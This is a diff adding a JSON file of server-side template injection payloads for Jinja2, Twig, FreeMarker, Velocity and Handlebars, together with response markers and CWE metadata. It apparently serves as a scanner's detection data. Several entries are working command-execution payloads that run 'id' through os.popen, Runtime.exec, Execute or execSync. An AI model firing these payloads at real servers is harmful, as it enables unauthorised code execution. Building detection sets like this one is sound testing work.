@@ -1,0 +1,16 @@
+{
+  "variants": {
+    "jinja2": ["{{7*7}}", "{{7*'7'}}", "{{config}}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "{{ ''.__class__.__mro__[1].__subclasses__() }}"],
+    "twig": ["{{7*7}}", "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}", "{{7*'7'}}", "{{dump(app)}}", "{{app.request.server.get(\"HTTP_HOST\")}}"],
+    "freemarker": ["${7*7}", "<#if 7*7==49>yes</#if>", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "#{7*7}", "[#assign value=\"freemarker.template.utility.Execute\"?new()]${value(\"id\")}"],
+    "velocity": ["#set($e=\"exp\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")", "$class.inspect(\"java.lang.Runtime\").runtime.exec(\"id\")"],
+    "handlebars": ["{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id')\"}}{{this.pop}}{{#with conslist}}{{this.pop this.firstObject}}{{/with}}{{/with}}{{/with}}{{/with}}"],
+    "generic": ["${7*7}", "#{7*7}", "<%=7*7%>", "{{7*7}}", "*{7*7}", "{{=7*7}}"]
+  },
+  "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "<#if 7*7==49>yes</#if>"],
+  "markers": ["49", "7777777", "jinja", "twig", "freemarker", "velocity", "root:x:0:0", "uid=", "com.sun.xml.internal.bind", "org.springframework"],
+  "metadata": {
+    "cwe": "CWE-1336",
+    "technique": "SSTI (Server-Side Template Injection)"
+  }
+}
